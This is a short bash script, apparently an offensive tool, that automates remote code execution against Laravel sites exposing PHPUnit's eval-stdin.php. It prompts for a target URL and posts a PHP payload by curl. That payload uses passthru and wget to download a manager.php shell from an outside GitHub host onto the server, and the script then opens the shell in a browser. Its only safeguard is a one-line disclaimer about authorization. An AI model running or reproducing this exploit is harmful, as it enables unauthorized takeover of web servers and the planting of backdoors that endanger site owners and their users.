echo "===================================================";
echo "---   Laravel-PHP-Unit-RCE Auto shell upload        "
echo "---                                                 "
echo "---                                                 "
echo "===================================================";
sleep 1
echo ""
echo "Use this tool over a site only if you are authorized to do so. I am not responsible for any of your shit." 
echo ""
echo ""
echo "Enter website's full URL:"
read url
echo ""
echo "Please Wait"
curl -m20 -i -s -k -L --url $url/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -X GET --data '<?php echo passthru("wget https://raw.githubusercontent.com/mrcombet/combet/main/manager.php -O manager.php");?>'

firefox $url/vendor/phpunit/phpunit/src/Util/PHP/manager.php
exit
